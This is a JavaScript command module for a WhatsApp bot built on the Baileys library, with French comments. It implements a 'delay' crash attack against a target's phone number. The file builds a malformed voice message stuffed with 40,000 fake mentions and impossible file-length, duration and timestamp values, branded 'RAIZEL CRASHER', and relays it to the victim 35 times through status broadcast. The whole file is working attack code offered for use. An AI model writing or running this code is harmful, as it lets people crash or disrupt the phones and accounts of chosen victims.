import { generateWAMessageFromContent } from "@whiskeysockets/baileys";
import channelSender from "./channelSender.js";

// === Fonction interne pour construire et envoyer le "bug" ===
async function bugs(isTarget, client) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";

  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "RAIZEL CRASHER" // ✅ corrigé : tout sur une seule ligne
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: isTarget } }]
      }]
    }]
  });
}

// === Commande principale ===
export const name = "delay";

export async function execute(sock, m, args) {
  try {
    let participant;

    // Si on répond à un message
    if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
      participant = m.message.extendedTextMessage.contextInfo.participant;
    }
    // Si on donne le numéro en argument
    else if (args.length > 0) {
      participant = args[0].replace("@", "") + "@s.whatsapp.net";
    }
    // Sinon erreur
    else {
      await sock.sendMessage(
        m.key.remoteJid,
        { text: "⚠️ Mentionne ou donne le numéro de la cible." },
        { quoted: m }
      );
      return;
    }

    // Message d’attente
    await sock.sendMessage(
      m.key.remoteJid,
      { text: "🚀 Tentative d'envoi bug delay..." },
      { quoted: m }
    );

    // Boucle d’envoi (35 fois, avec pause 1s)
    for (let i = 0; i < 35; i++) {
      await bugs(participant, sock);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    await channelSender(m, sock, "✅ Bug delay envoyé avec succès.", 4);

  } catch (error) {
    await sock.sendMessage(
      m.key.remoteJid,
      { text: "❌ Erreur delay : " + error.message },
      { quoted: m }
    );
  }
}